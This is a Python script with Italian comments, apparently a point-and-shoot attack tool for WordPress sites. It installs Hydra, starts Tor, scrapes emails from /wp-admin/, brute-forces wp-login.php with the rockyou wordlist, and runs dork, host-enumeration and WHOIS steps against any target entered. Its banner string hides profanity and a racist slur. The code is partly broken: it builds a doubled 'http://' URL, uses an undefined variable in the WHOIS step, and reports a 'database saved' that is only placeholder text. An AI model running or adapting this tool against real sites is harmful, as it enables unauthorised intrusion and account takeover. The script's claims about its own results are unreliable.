import os
import subprocess
import requests
import re
import time
from bs4 import BeautifulSoup, Comment
import whois
import random
import sys

def pulisci_schermo():
    """Pulisce lo schermo del terminale."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_matrix_effect(duration=5):
    """Mostra un effetto di caratteri che scendono in stile Matrix."""
    columns = 80  # Dimensione tipica del terminale
    rows = 24     # Dimensione tipica del terminale
    chars = "ercazoercazzoercazzoerc4azzoercazzo3rc4zzoercazzonesucanegrodimerda1233909"

    end_time = time.time() + duration
    while time.time() < end_time:
        # Costruisci la griglia di caratteri
        grid = [[' ' for _ in range(columns)] for _ in range(rows)]
        for y in range(rows):
            for x in range(columns):
                if random.random() < 0.1:
                    grid[y][x] = random.choice(chars)

        # Stampa la griglia
        for row in grid:
            print(''.join(row))
        sys.stdout.flush()
        time.sleep(0.1)
        pulisci_schermo()

def start_tor():
    """Avvia Tor in background e nasconde l'output."""
    print("Tor in avvio...")
    try:
        subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(10)  # Attende che Tor sia avviato
        print("Tor avviato correttamente.")
    except Exception as e:
        print(f"Errore durante l'avvio di Tor: {e}")

def install_tool(tool_name, install_command):
    """Verifica se un tool è installato e, in caso contrario, lo installa."""
    try:
        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{tool_name} è già installato.")
        return True
    except FileNotFoundError:
        print(f"{tool_name} non trovato. Installazione in corso...")
        try:
            subprocess.run(install_command, shell=True, check=True)
            print(f"{tool_name} installato correttamente.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"Errore durante l'installazione di {tool_name}: {e}")
            return False

def install_required_tools():
    """Installa i tool necessari se non sono presenti."""
    install_tool('hydra', 'sudo apt-get install -y hydra')
    install_tool('git', 'sudo apt-get install -y git')
    
    # Installazione di HostHunter
    if not os.path.exists('HostHunter'):
        print("Clonazione di HostHunter da GitHub...")
        try:
            subprocess.run('git clone https://github.com/SpiderLabs/HostHunter.git', shell=True, check=True)
            print("HostHunter installato correttamente.")
        except subprocess.CalledProcessError as e:
            print(f"Errore durante la clonazione di HostHunter: {e}")
    else:
        print("HostHunter è già presente.")

def find_admin_page(url):
    """Trova la pagina admin del sito web"""
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.get(f"http://{url}/wp-admin/", headers=headers, timeout=5)
        if response.status_code == 200:
            print("\nPagina Admin trovata!")
            print(f"URL: {response.url}")

            # Estrae le email e altre informazioni utili dalla pagina
            soup = BeautifulSoup(response.text, 'html.parser')
            emails = set(re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response.text))
            print("\nEmail trovate:")
            for email in emails:
                print(email)

            # Scarica la pagina admin in un file HTML
            html_file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{url.replace('/', '')}_admin.html")
            with open(html_file_path, 'w') as file:
                file.write(response.text)
            print(f"Pagina admin salvata in {html_file_path}")

            # Simula il salvataggio del database in un file di testo
            save_database_to_txt(url)

            # Tentativo di brute force con Hydra
            brute_force_hydra(url, "/wp-login.php")
        else:
            print("Pagina Admin non trovata.")
    except Exception as e:
        print(f"Errore durante la ricerca della pagina admin: {e}")

def save_database_to_txt(url):
    """Simula il salvataggio del database in un file di testo"""
    database_content = "Simulazione dei dati del database estratti."
    try:
        txt_file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{url.replace('/', '')}_database.txt")
        with open(txt_file_path, 'w') as file:
            file.write(database_content)
        print(f"\nDatabase salvato in {txt_file_path}")
    except Exception as e:
        print(f"Errore durante il salvataggio del database: {e}")

def brute_force_hydra(url, login_path):
    """Esegue un attacco di brute force con Hydra"""
    print("\nInizio brute force con Hydra...")
    try:
        result = subprocess.check_output(
            ['hydra', '-l', 'admin', '-P', '/usr/share/wordlists/rockyou.txt', '-s', '80', '-f', f'{url}', 'http-post-form', f"{login_path}:log=^USER^&pwd=^PASS^:S=302"],
            text=True
        )
        print(f"Risultati Hydra:\n{result}")
    except subprocess.CalledProcessError as e:
        print(f"Errore durante il brute force con Hydra: {e}")

def scan_for_errors(url):
    """Scansiona il sito web alla ricerca di commenti HTML e altre potenziali vulnerabilità"""
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Controlla i commenti HTML
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        if comments:
            print("\nCommenti HTML trovati:")
            for comment in comments:
                print(comment)

        # Controlla altre vulnerabilità comuni
        if "wp-content" in response.text:
            print("\nPotenziale vulnerabilità WordPress trovata!")

    except Exception as e:
        print(f"Errore durante la scansione: {e}")

def google_dorks_search(url):
    """Esegue una ricerca Google Dorks per il sito web target."""
    print("Eseguendo ricerca Google Dorks...")
    dorks = [
        f"inurl:admin site:{url}",
        f"inurl:login site:{url}",
        f"intext:'index of' site:{url}"
    ]
    for dork in dorks:
        print(f"Query: {dork}")
        time.sleep(2)  # Simula la ricerca (in realtà, dovrebbe essere eseguita manualmente)

def hosthunter_scan(domain):
    """Esegue la scansione dei sottodomini utilizzando HostHunter."""
    try:
        print(f"Eseguendo scansione HostHunter per il dominio {domain}...")
        result = subprocess.check_output(['python3', 'HostHunter/HostHunter.py', '-d', domain], text=True)
        print(f"Risultati HostHunter:\n{result}")
    except subprocess.CalledProcessError as e:
        print(f"Errore durante la scansione HostHunter: {e}")

def perform_whois_lookup(domain):
    """Esegue una ricerca WHOIS per il dominio e stampa i risultati"""
    try:
        print(f"Eseguendo ricerca WHOIS per il dominio {url}...")
        whois_info = whois.whois(url)
        print("Informazioni WHOIS trovate:")
        for key, value in whois_info.items():
            print(f"{key}: {value}")
    except Exception as e:
        print(f"Errore durante la ricerca WHOIS: {e}")

def main():
    pulisci_schermo()
    display_matrix_effect()  # Mostra l'effetto Matrix

    # Dopo l'animazione, prosegui con le installazioni e altre operazioni
    install_required_tools()  # Installazione dei tool richiesti
    start_tor()

    target_url = input("Inserisci il sito web target (senza http/https): ").strip()
    if not target_url.startswith('http://') and not target_url.startswith('https://'):
        target_url = 'http://' + target_url

    find_admin_page(target_url)
    scan_for_errors(target_url)
    google_dorks_search(target_url)
    hosthunter_scan(target_url)
    perform_whois_lookup(target_url)

if __name__ == "__main__":
    main()
